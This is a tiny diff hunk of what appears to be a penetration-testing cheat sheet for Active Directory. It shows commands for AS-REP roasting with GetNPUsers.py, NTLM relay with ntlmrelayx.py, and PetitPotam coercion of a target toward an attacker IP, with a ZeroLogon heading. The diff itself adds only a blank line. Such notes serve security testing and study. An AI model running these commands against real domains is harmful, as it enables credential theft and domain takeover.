@@ -9,6 +9,7 @@ GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/xato-n
 
 ## PetitPotam
 ntlmrelayx.py -smb2support
+
 python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>
 
 ## ZeroLogin
